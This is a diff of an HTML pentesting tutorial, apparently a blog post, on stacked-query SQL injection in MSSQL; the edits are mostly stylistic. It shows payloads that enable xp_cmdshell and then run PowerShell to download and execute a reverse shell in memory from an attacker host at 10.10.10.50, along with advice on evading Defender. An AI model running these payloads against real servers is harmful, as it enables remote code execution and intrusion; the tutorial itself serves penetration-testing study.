@@ -133,9 +133,9 @@
 
 <hr class="hero-divider">
 
-  <p>Most pentesters or OffSec students are familiarized with inbound SQLi. Those are the kind of injections that give the user some text back to the browser. They are easier to exploit and easier to identify. But a site may be still vulnerable to SQLi even if the app isn't giving you anything back. It may allow you to run stacked queries. And you can own an actual box if that's present. Keep reading and let me explain what that is, and how it can be abused.</p>
+  <p>Most pentesters or OffSec students are familiar with inbound SQLi. Those are the injections that give you text back in the browser. Easier to exploit, easier to identify. But a site can still be vulnerable to SQLi even when the app gives you nothing back. It may support stacked queries. And if it does, you can own the box. Keep reading and I'll explain what that is and how to abuse it.</p>
 
-  <p>Let's start by defining the term. A stacked query is just two or more SQL statements separated by a semicolon, both executed in the same call. For example, check the two queries below:</p>
+  <p>Let's start by defining the term. A stacked query is just two or more SQL statements separated by a semicolon, both executed in one call. Check the two queries below:</p>
 
   <div class="terminal">
     <div class="terminal-bar">
@@ -147,18 +147,18 @@
     </div>
   </div>
 
-  <p>For someone who does not know TSQL it may look like a single query. But the semicolon breaks it down into two.</p>
+  <p>For someone who doesn't know TSQL it may look like a single query. But the semicolon breaks it down into two.</p>
 
   <p>Now, both run. The problem is the app usually only shows the result of the first one. So even if your second query does something useful, you won't see it in the response.</p>
 
-  <p>MSSQL supports this natively. MySQL and Oracle? They do not, at least not in most driver configurations. So when you're dealing with MSSQL, stacked queries are a real attack surface even when everything looks blind.</p>
+  <p>MSSQL supports this natively. MySQL and Oracle? They don't, at least not in most driver configurations. So when you're dealing with MSSQL, stacked queries are a real attack surface even when everything looks blind.</p>
 
   <div class="callout note">
     <div class="callout-title">&#x25CF; enumeration tip</div>
     This highlights the importance of enumeration. Use nmap or Wappalyzer to identify the technology running behind a site. If it runs Windows, chances are MSSQL is also present.
   </div>
 
-  <p>I remember this being a huge debate back during my DBA days when I was still working for Hewlett Packard. My colleagues, Oracle DBAs, said stacked queries were bad and insecure. But at the same time, the implementation of some solutions was actually easier with TSQL because Microsoft MSSQL supports stacked queries and Linked Servers. Even today and as far as I know, this is not something Oracle does natively. To be honest, it is a curse and a blessing at the same time. And soon you will see why.</p>
+  <p>I remember this being a huge debate back during my DBA days when I was still working for Hewlett Packard. My colleagues, Oracle DBAs, said stacked queries were bad and insecure. But at the same time, the implementation of some solutions was actually easier with TSQL because Microsoft MSSQL supports stacked queries and Linked Servers. Even today and as far as I know, this is not something Oracle does natively. To be honest, it's a curse and a blessing at the same time. And soon you'll see why.</p>
 
   <!-- SECTION 2 -->
   <div class="section-title">02 &mdash; technique comparison</div>
@@ -276,7 +276,7 @@
     <div class="step-body"><span style="color:#58a6ff">';</span> EXEC sp_configure <span style="color:#e3b341">'xp_cmdshell'</span>, 1; RECONFIGURE; <span style="color:#8b949e">--</span></div>
   </div>
 
-  <p>Now we are ready for the last two payloads that will, in this case, give us access to the underlying application or server:</p>
+  <p>Now we're ready for the last two payloads. These are the ones that get us access to the underlying application or server:</p>
 
   <!-- STEP 1 -->
   <div class="step-block yellow-accent">
@@ -301,7 +301,7 @@
     <div class="step-body"><span style="color:#f85149">'; EXEC xp_cmdshell</span> <span style="color:#e3b341">'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.10.50/shell.txt'')"'</span>; <span style="color:#8b949e">--</span></div>
   </div>
 
-  <p>The last step is the one doing the heavy lifting here. Notice that instead of dropping a binary to disk and executing it, you're telling PowerShell to reach out to your HTTP server, pull shell.txt directly into memory, and execute it on the spot. Nothing written to disk. It is a classic in-memory execution technique and a better approach than dropping malicious files on disk to obtain a reverse shell. A file on disk will be flagged immediately by Defender.</p>
+  <p>The last step is the one doing the heavy lifting here. Notice that instead of dropping a binary to disk and executing it, you're telling PowerShell to reach out to your HTTP server, pull shell.txt directly into memory, and execute it on the spot. Nothing written to disk. It's a classic in-memory execution technique, and it beats dropping a file to disk to get your reverse shell. A file on disk gets flagged by Defender immediately.</p>
 
   <div class="callout note">
     <div class="callout-title">&#x25CF; revshellgenerator</div>
@@ -349,7 +349,7 @@
   <div class="section-title">05 &mdash; notes</div>
   <h2>Few things to keep in mind</h2>
 
-  <p>xp_cmdshell runs as the SQL Server service account at the Windows level, not as sa. sa is a SQL login, not a Windows account. So even after impersonating sa inside SQL Server, the OS commands that xp_cmdshell spawns run under whatever Windows identity the SQL Server service is using. In a lot of lab environments that's a local admin or NT SERVICE\MSSQLSERVER. In others it's more restricted. whoami command will help you here.</p>
+  <p>xp_cmdshell runs as the SQL Server service account at the Windows level, not as sa. sa is a SQL login, not a Windows account. So even after impersonating sa inside SQL Server, the OS commands that xp_cmdshell spawns run under whatever Windows identity the SQL Server service is using. In a lot of lab environments that's a local admin or NT SERVICE\MSSQLSERVER. In others it's more restricted. Run whoami and see for yourself.</p>
 
   <p>Stacked queries are one of those SQLi techniques that don't get enough attention. Most people see a blind injection and move on. Don't. Test the WAITFOR, measure the delta, and if the server sleeps, you're already halfway to a shell. The rest is just chaining the right payloads in the right order.</p>
 
